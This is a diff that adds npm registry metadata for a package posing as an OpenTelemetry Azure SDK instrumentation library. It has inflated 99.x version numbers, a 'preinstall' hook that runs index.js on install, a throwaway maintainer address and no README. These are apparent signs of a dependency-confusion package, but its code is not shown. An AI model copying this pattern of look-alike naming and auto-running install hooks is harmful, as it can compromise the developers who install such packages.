@@ -1,0 +1,103 @@
+{
+    "_id": "opentelemetry-instrumentation-azure-sdk",
+    "_rev": "1-0105cc4cc689ec3b27a5b53613748991",
+    "name": "opentelemetry-instrumentation-azure-sdk",
+    "dist-tags": {
+        "latest": "99.10.10"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "opentelemetry-instrumentation-azure-sdk",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "opentelemetry-instrumentation-azure-sdk@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-udyNJVNE+5sO9UgUjVROUAsLc1mq4OuJiisCtVfIqRWoOhRUmmmng11CZfMokP4n2r4EWxcK6PTq2dbxoXxVIg==",
+                "shasum": "e6f836c8038622ee7c5334317459ba34bd286136",
+                "tarball": "https://registry.npmjs.org/opentelemetry-instrumentation-azure-sdk/-/opentelemetry-instrumentation-azure-sdk-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5088,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNfWEACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrS4hAAhsMzzgt+4w35Ryh39rckf6kMM2BgrN6hxPaAYk7sBWjH25po\r\nxaTAuCctoTp3CD1eih/R6HWCYX4B15s6s4TsJkGTDISsO6C53cdUXFfw24dS\r\nzgo4Jo+oSj0s+uaZtlukHwxtUjWjxZyIXNkvIq8lvwf+mpEhmWe7M7HImkcY\r\n4IS5YC5NoLonn5zoPj8ewuls8uIDRYLmbnUevPqbA0J6egD/ZBuPamSnBuf/\r\naJMqnUD+qwVhWoAttN2Yk4k2tgMY5uYBWOf1QHN1O2eCO3SeoOf0KWrWCI5m\r\njYDqalknZvHDoR6gXPDLlEud3mVJ9toYm4vhZbHtSwqMjRyH9SJ411hxs4Xt\r\n32kekw+AC4m7tCGZ5pnIqzcssYAWco63vqBWNJqmSmB7srq6OlzBjwHIHiGc\r\nu6Odxd+qKofoaIsJ927cqeHhMDUv3LvkQVmS0NOIwxr+HA6S6fi0m4W6otmp\r\n2GghLQ3DKM7JQC8YEei5b9ZcGbhubQgAMZbb1C1esyG95rKHAnP6zXs2do8j\r\nzvwDgXDsRfe04dnLxigK494wKrkluACn3VxIrioLnsTDgGN8saJvHawFTaZy\r\ntxotrgnevgjbwumo5wOjddYOcFGOPCwsTpjrHsiuOyMOm8v7TXLJvUABgkGV\r\ngNmRM5sKt0Qr+5QAZk71stfOtTLNc6qVID8=\r\n=g5La\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "wfntw8gs",
+                "email": "wfntw8gs@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "wfntw8gs",
+                    "email": "wfntw8gs@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/opentelemetry-instrumentation-azure-sdk_99.10.9_1647703428434_0.2513509056072283"
+            },
+            "_hasShrinkwrap": false
+        },
+        "99.10.10": {
+            "name": "opentelemetry-instrumentation-azure-sdk",
+            "version": "99.10.10",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "opentelemetry-instrumentation-azure-sdk@99.10.10",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-i5SgqbIYvScMJfDivo6TrOTMqc08lfvKZK3ZbmWF2NPBhe95ooeBDwhrD4/QoSOLO5UXKaakiuvI6PTcJRy2AQ==",
+                "shasum": "b41acb7915db74a2db84d835264364eeada7afa4",
+                "tarball": "https://registry.npmjs.org/opentelemetry-instrumentation-azure-sdk/-/opentelemetry-instrumentation-azure-sdk-99.10.10.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5092,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNggKACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmphIA//YqR2nYSuCvV5T3550qUHPaNt8XIi1hcar2c8jd6QTpw+CpZq\r\nhiucSX+47INSSCd/93CmnP3ndx0zVUXuVBtpSNb7adRpfMqeZpzeIFaQP1fd\r\nePbWObwg9zlm8JiC/JmKDiWquMCcWpdM8/7f4tRkxw+ds/9stmIRfBnKy2D9\r\nzMEg3RiKm4SCed0L9AVYdQnpEwF/oNQQd6zpyUcDWMM2GL8T8QBXYdtskNh7\r\njX0FSUcKVe2Qh+iWXuvy+4WAWKy3DVwJyxka2qi+SHSwMC9y/AR39omLq2DR\r\nYJNlEQlCzZ07lfb8uG6+qRkNEgJ79vTQ+udA3wldVaRIocuDuCtbtA2VmXhs\r\nKCQE7REcrQTN9WbTBuW3cWTr6oTFyy0dMMErAjDSpD4EIXYqNGQJHeCzFF3X\r\nZiBM+Q8g/UIxFxHSS7Y/r1/6lDar/O2geNO2yrKFLUMCjUcnc7gL129KI2To\r\nVae66wLTP+6x4TCr1E1F3QO8GTwJXPweTmg2peFyCNYTiTei5pFoqjahbVGs\r\nkfwyukwADWqigyKj9v+Dl/lReIdjd9FUKLl+pOU7aI8mH/qgUTMuh85sPdzO\r\nJ21fvdW9bPPRVSGcP0e6hA7bAsF4YtYbcSy55zl+A/wA2FSBFbKIf2gxbS+f\r\nicGAMSeK+v8dWxOMVG83QrOB5SI4schzans=\r\n=qA2D\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "wfntw8gs",
+                "email": "wfntw8gs@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "wfntw8gs",
+                    "email": "wfntw8gs@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/opentelemetry-instrumentation-azure-sdk_99.10.10_1647708169998_0.5391112996812366"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T15:23:48.434Z",
+        "99.10.9": "2022-03-19T15:23:48.625Z",
+        "modified": "2022-03-19T16:42:50.197Z",
+        "99.10.10": "2022-03-19T16:42:50.142Z"
+    },
+    "maintainers": [
+        {
+            "name": "wfntw8gs",
+            "email": "wfntw8gs@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
